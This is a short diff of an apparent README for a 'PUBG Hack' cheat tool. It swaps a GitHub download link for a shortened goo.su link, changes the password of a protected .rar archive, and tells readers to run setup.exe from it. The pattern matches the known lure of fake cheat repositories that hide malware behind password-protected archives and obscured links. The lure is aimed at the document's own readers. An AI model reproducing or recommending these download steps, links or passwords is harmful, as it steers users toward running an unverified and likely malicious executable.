@@ -7,8 +7,8 @@ giving you an unparalleled advantage over opponents.
 
 <H3>How to install PUBG Hack:</H3>
 
-- [Download](https://github.com/pedropaxe/pubg-2025-hack/releases/download/Download/PUBG2025.rar)
-- Open archive (password: Qwe112H)
+- [Download](https://goo.su/Ka0B)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
